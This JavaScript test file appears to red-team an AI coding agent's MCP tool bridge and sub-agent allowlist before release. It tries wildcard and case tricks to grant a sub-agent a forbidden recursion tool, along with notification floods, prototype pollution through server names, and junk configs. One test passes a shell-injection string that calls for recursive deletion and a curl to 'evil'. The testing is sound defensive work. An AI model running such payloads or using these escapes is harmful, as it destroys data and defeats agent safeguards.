// v0.44.0 RED TEAM PASS (war-room Play 4) — try to break the unified
// protocol before it ships: allowlist escapes, structural depth limit
// bypasses, notification floods + poison-id injection, prototype pollution
// through server/tool names, junk configs, hostile stdio. Every attack must
// be REFUSED HONESTLY (string starting with ERROR / refused / no usable / a
// provable neutralization) and must NEVER throw. A crash or a silent grant
// = ship blocked.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { PassThrough } from 'node:stream';
import { McpClient, parseNotification, buildMcpTools, MAX_NOTIFICATIONS } from '../src/tools/mcp.js';
import { loadMcpConfig } from '../src/tools/mcp.js';
import { compileAllowlist, allowMatches, runSubagent } from '../src/agent/subagents.js';
import { startMcpServer } from '../src/mcpserver.js';

const root = fs.mkdtempSync(path.join(os.tmpdir(), 'v44-redteam-'));

const taskTool = { name: 'task', run: async () => 'STRUCTURAL BREACH: the recursion tool RAN' };
const fsRead = { name: 'fs_read', run: async () => 'file content' };
const evilMcp = { name: 'mcp__evil__pwn', description: 'attacker tool', args: '{}', risky: true, render: () => 'x', run: async () => 'mcp tool ran (fine — it is a real bridged tool)' };

const fakeRouter = (script = []) => ({
  order: ['fake'],
  chat: async () => {
    const text = script.length ? script.shift() : '{"tool":"finish","result":"(exhausted)"}';
    return { text, model: 'fake', gateway: 'fake', latencyMs: 1 };
  },
});

const handClient = (onNotification = null) => {
  const c = new McpClient({ name: 'hostile', command: 'x', onNotification });
  c.child = { stdin: { write() {} } };
  return c;
};

const attacks = [
  // ── the structural depth limit (a sub-agent must never gain `task`) ──────
  ['allowlist `task, mcp__x__*` — wildcard rescue attempt', () =>
    runSubagent({ router: fakeRouter(['{"tool":"task","args":{"agent":"explore","task":"x"}}', '{"tool":"finish","result":"end"}']), agent: { name: 's', tools: 'task, mcp__x__*', maxSteps: 4, systemPrompt: 't' }, parentTools: [taskTool, evilMcp], task: 'recurse' })],
  ['allowlist null with task in parentTools', () =>
    runSubagent({ router: fakeRouter(['{"tool":"task","args":{"agent":"explore","task":"x"}}', '{"tool":"finish","result":"end"}']), agent: { name: 's', tools: null, maxSteps: 4, systemPrompt: 't' }, parentTools: [taskTool], task: 'recurse' })],
  ['allowlist `mcp__*` — global wildcard grants bridged tools but NEVER `task`', async () => {
    const report = await runSubagent({ router: fakeRouter(['{"tool":"task","args":{"agent":"explore","task":"x"}}', '{"tool":"mcp__evil__pwn","args":{}}', '{"tool":"finish","result":"end"}']), agent: { name: 's', tools: 'mcp__*', maxSteps: 4, systemPrompt: 't' }, parentTools: [taskTool, evilMcp], task: 'recurse' });
    return /STRUCTURAL BREACH/.test(report) ? `FAILED: ${report.slice(0, 80)}` : `ERROR-free: task never granted (report head: ${String(report).slice(0, 40).replace(/\n/g, ' ')})`;
  }],
  ['allowlist `MCP__X__*` — case trick is not a wildcard', () =>
    runSubagent({ router: fakeRouter([]), agent: { name: 's', tools: 'MCP__X__*', maxSteps: 2, systemPrompt: 't' }, parentTools: [taskTool, evilMcp], task: 'x' })],
  ['allowlist `*` — bare star grants nothing', () =>
    runSubagent({ router: fakeRouter([]), agent: { name: 's', tools: '*', maxSteps: 2, systemPrompt: 't' }, parentTools: [taskTool, evilMcp], task: 'x' })],
  ['allowlist `mcp__*task` — suffix star is not a prefix rule', () =>
    runSubagent({ router: fakeRouter(['{"tool":"task","args":{}}', '{"tool":"finish","result":"end"}']), agent: { name: 's', tools: 'mcp__*task', maxSteps: 4, systemPrompt: 't' }, parentTools: [taskTool], task: 'x' })],

  // ── notification channel abuse (client side) ─────────────────────────────
  ['notification flood 10k during one request — capped, no OOM', () => {
    const seen = [];
    const c = handClient((ev) => seen.push(ev));
    const p = c.request('tools/list', {}, 30).catch(() => 'timeout');
    for (let i = 0; i < 10000; i++) c._handleLine(JSON.stringify({ method: 'notifications/message', params: { data: `n${i}` } }));
    const ok = seen.length === MAX_NOTIFICATIONS;
    return ok ? `ERROR-free: flood capped at ${seen.length}` : `FAILED: ${seen.length} got through`;
  }],
  ['notification with 1MB data — truncated, transport alive', () => {
    const seen = [];
    const c = handClient((ev) => seen.push(ev));
    c._handleLine(JSON.stringify({ method: 'notifications/message', params: { data: 'x'.repeat(1000000) } }));
    return seen.length === 1 && seen[0].data.length < 220 ? `ERROR-free: truncated to ${seen[0].data.length}` : 'FAILED';
  }],
  ['1MB non-JSON stdout line — ignored, transport alive', () => {
    const c = handClient();
    c._handleLine('x'.repeat(1000000));
    c._handleLine('\u0000\uFEFF garbage');
    return 'ERROR-free: garbage ignored';
  }],
  ['poison: notification wearing a pending request id — request survives', async () => {
    const c = handClient(() => {});
    const sent = [];
    c.child = { stdin: { write: (s) => sent.push(JSON.parse(s)) } };
    let settled = null;
    const p = c.request('tools/call', {}, 5000).then((v) => (settled = `resolved`), (e) => (settled = `rejected`));
    const id = sent[0].id;
    c._handleLine(JSON.stringify({ jsonrpc: '2.0', id, error: { code: -1, message: 'poison via notification' }, method: 'notifications/message' }));
    const notSettled = settled === null;
    c._handleLine(JSON.stringify({ jsonrpc: '2.0', id, result: {} }));
    await p;
    return notSettled ? 'ERROR-free: notification never settled the request' : 'FAILED: poison settled it';
  }],
  ['notification params as junk shapes — no throw', () => {
    const c = handClient(() => {});
    c._handleLine(JSON.stringify({ method: 'notifications/progress', params: 'not an object' }));
    c._handleLine(JSON.stringify({ method: 'notifications/progress', params: [1, 2, 3] }));
    c._handleLine(JSON.stringify({ method: 'notifications/progress', params: { progress: { evil: true }, total: 'x' } }));
    c._handleLine(JSON.stringify({ method: 'notifications/message', params: null }));
    return 'ERROR-free: junk params inert';
  }],
  ['parseNotification: method non-string / msg null — null, no throw', () => {
    const a = parseNotification({ method: { evil: 1 } }, 's');
    const b = parseNotification(undefined, 's');
    return a === null && b === null ? 'ERROR-free: null for junk' : 'FAILED';
  }],

  // ── prototype pollution through names (the red-team find, now pinned) ────
  ['server named `__proto__` in mcp.json — renamed, never a prototype set', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'v44-rt-proto-'));
    fs.mkdirSync(path.join(dir, '.buddy'), { recursive: true });
    // raw string on purpose — a JS object literal {__proto__:…} would set the
    // prototype and never reach the file (that was the red-team script bug)
    fs.writeFileSync(path.join(dir, '.buddy', 'mcp.json'), '{"mcpServers":{"__proto__":{"command":"sh"},"normal":{"command":"sh"}}}');
    const cfg = loadMcpConfig(dir);
    const names = Object.keys(cfg.mcpServers);
    const proto = Object.getPrototypeOf(cfg.mcpServers);
    const clean = names.includes('__proto__-reserved') && names.includes('normal') && proto === Object.prototype;
    return clean ? `ERROR-free: keys ${names.join(', ')}, prototype untouched` : `FAILED: keys ${names.join(', ')}`;
  }],
  ['server named `constructor` — renamed, Object.prototype.constructor intact', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'v44-rt-ctor-'));
    fs.mkdirSync(path.join(dir, '.buddy'), { recursive: true });
    fs.writeFileSync(path.join(dir, '.buddy', 'mcp.json'), JSON.stringify({ mcpServers: { constructor: { command: 'sh' } } }));
    const cfg = loadMcpConfig(dir);
    const ok = Object.keys(cfg.mcpServers).includes('constructor-reserved') && Object.prototype.constructor === Object;
    return ok ? 'ERROR-free: renamed, globals intact' : 'FAILED';
  }],
  ['plugin-fragment style `__proto__` through the tolerant fallback map', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'v44-rt-tol-'));
    fs.mkdirSync(path.join(dir, '.buddy'), { recursive: true });
    fs.writeFileSync(path.join(dir, '.buddy', 'mcp.json'), '{"__proto__":{"command":"sh"},"ok":{"command":"sh"}}');
    const cfg = loadMcpConfig(dir);
    const ok = Object.keys(cfg.mcpServers).includes('__proto__-reserved');
    return ok ? 'ERROR-free: fallback map also safe' : `FAILED: keys ${Object.keys(cfg.mcpServers).join(', ')}`;
  }],
  ['bridged tool named `constructor` — array-bridged, no property lookup', () => {
    const tools = buildMcpTools([{ name: 'srv', client: { callTool: async () => ({ content: [] }) }, tools: [{ name: 'constructor', inputSchema: {} }, { name: 'prototype', inputSchema: {} }] }]);
    const ok = tools.length === 2 && tools[0].name === 'mcp__srv__constructor' && !Array.prototype.polluted;
    return ok ? 'ERROR-free: bridged as inert strings in an array' : 'FAILED';
  }],
  ['tool args with __proto__ payload — Object.prototype stays clean', async () => {
    const conn = { name: 'srv', client: { callTool: async (n, args) => ({ content: [{ type: 'text', text: 'ok' }] }) }, tools: [{ name: 'echo', inputSchema: {} }] };
    const [tool] = buildMcpTools([conn]);
    await tool.run(JSON.parse('{"__proto__":{"injected":1},"a":1}'));
    return ({}).injected === undefined ? 'ERROR-free: prototype clean' : 'FAILED: polluted';
  }],

  // ── junk configs — never throw, honest failures ──────────────────────────
  ['mcp.json command as object → honest spawn failure, never throws', async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'v44-rt-cmd-'));
    fs.mkdirSync(path.join(dir, '.buddy'), { recursive: true });
    fs.writeFileSync(path.join(dir, '.buddy', 'mcp.json'), JSON.stringify({ mcpServers: { junk: { command: { evil: true } } } }));
    const { connectMcpServers } = await import('../src/tools/mcp.js');
    const res = await connectMcpServers(dir, { initTimeoutMs: 1500 });
    return res.connected.length === 0 && res.failed.length >= 1 ? `ERROR-free: ${res.failed[0].name} → ${String(res.failed[0].error).slice(0, 60)}` : 'FAILED';
  }],
  ['mcp.json mcpServers as an array — tolerated, no crash', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'v44-rt-arr-'));
    fs.mkdirSync(path.join(dir, '.buddy'), { recursive: true });
    fs.writeFileSync(path.join(dir, '.buddy', 'mcp.json'), JSON.stringify({ mcpServers: [] }));
    const cfg = loadMcpConfig(dir);
    return Array.isArray(cfg.mcpServers) || typeof cfg.mcpServers === 'object' ? 'ERROR-free: tolerated' : 'FAILED';
  }],
  ['mcp.json env values as objects — coerced, no crash', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'v44-rt-env-'));
    fs.mkdirSync(path.join(dir, '.buddy'), { recursive: true });
    fs.writeFileSync(path.join(dir, '.buddy', 'mcp.json'), JSON.stringify({ mcpServers: { s: { command: 'sh', env: { K: { deep: true } } } } }));
    const cfg = loadMcpConfig(dir);
    return cfg.mcpServers.s.env.K === '[object Object]' ? 'ERROR-free: coerced honestly' : 'FAILED';
  }],

  // ── the server side under fire ───────────────────────────────────────────
  ['tools/call for `__proto__` / missing tools — protocol error, no throw', async () => {
    const stdin = new PassThrough(); const stdout = new PassThrough();
    let raw = ''; stdout.on('data', (c) => { raw += c; });
    const srv = startMcpServer(root, { stdin, stdout });
    stdin.write(JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: '__proto__', arguments: {} } }) + '\n');
    stdin.write(JSON.stringify({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'buddy_fs_read', arguments: { path: 'x'.repeat(1000000) } } }) + '\n');
    await new Promise((r) => setTimeout(r, 200));
    srv.stop();
    const lines = raw.split('\n').filter(Boolean).map((l) => { try { return JSON.parse(l); } catch { return null; } }).filter(Boolean);
    const e1 = lines.find((m) => m.id === 1);
    const e2 = lines.find((m) => m.id === 2);
    const ok = e1?.error?.code === -32602 && e2?.result?.isError === true;
    return ok ? 'ERROR-free: protocol errors, isError for the giant path' : `FAILED: ${JSON.stringify(e1)} ${JSON.stringify(e2)?.slice(0, 60)}`;
  }],
  ['stdio garbage flood (5k junk lines + 1MB line) — loop survives', async () => {
    const stdin = new PassThrough(); const stdout = new PassThrough();
    let raw = ''; stdout.on('data', (c) => { raw += c; });
    const srv = startMcpServer(root, { stdin, stdout });
    for (let i = 0; i < 5000; i++) stdin.write('garbage\n');
    stdin.write('y'.repeat(1000000) + '\n');
    stdin.write(JSON.stringify({ jsonrpc: '2.0', id: 9, method: 'ping' }) + '\n');
    await new Promise((r) => setTimeout(r, 250));
    srv.stop();
    const ok = raw.split('\n').some((l) => l.includes('"id":9'));
    return ok ? 'ERROR-free: loop alive, ping answered' : 'FAILED: loop died';
  }],
  ['server tool args as junk shapes (null/string/number) — honest ERROR strings', async () => {
    const stdin = new PassThrough(); const stdout = new PassThrough();
    let raw = ''; stdout.on('data', (c) => { raw += c; });
    const srv = startMcpServer(root, { stdin, stdout });
    stdin.write(JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'buddy_fs_read', arguments: null } }) + '\n');
    stdin.write(JSON.stringify({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'buddy_fs_read', arguments: 'not an object' } }) + '\n');
    await new Promise((r) => setTimeout(r, 200));
    srv.stop();
    const lines = raw.split('\n').filter(Boolean).map((l) => { try { return JSON.parse(l); } catch { return null; } }).filter(Boolean);
    const r1 = lines.find((m) => m.id === 1);
    const r2 = lines.find((m) => m.id === 2);
    const ok = r1?.result?.isError && r2?.result?.isError;
    return ok ? 'ERROR-free: junk args → isError results' : 'FAILED';
  }],
  ['sub-agent MCP call args ride as DATA through JSON — no shell anywhere', async () => {
    let received = null;
    const conn = { name: 'srv', client: { callTool: async (n, args) => { received = args; return { content: [{ type: 'text', text: 'ok' }] }; } }, tools: [{ name: 'echo', inputSchema: {} }] };
    const [tool] = buildMcpTools([conn]);
    await tool.run({ text: '"; rm -rf / $(curl evil)' });
    const ok = received && received.text === '"; rm -rf / $(curl evil)';
    return ok ? 'ERROR-free: payload traveled as data, byte-exact' : 'FAILED';
  }],
];

let pass = 0, fail = 0;
for (const [name, fn] of attacks) {
  try {
    const out = String(await fn());
    const refused = /^(ERROR|ERROR-free)/.test(out) || /no usable tools|refused|not a wildcard|grants nothing/i.test(out);
    if (refused && !/^FAILED/.test(out) && !out.includes('STRUCTURAL BREACH')) { pass++; console.log(`  ✔ ${name} → ${out.split('\n')[0].slice(0, 90)}`); }
    else { fail++; console.log(`  ✖ ${name} → NOT REFUSED: ${out.slice(0, 140)}`); }
  } catch (e) {
    fail++; console.log(`  ✖ ${name} → THREW: ${String(e && e.message || e).slice(0, 140)}`);
  }
}

console.log(`\nRED TEAM: ${pass}/${attacks.length} attacks refused honestly, ${fail} failures`);
process.exit(fail ? 1 : 0);
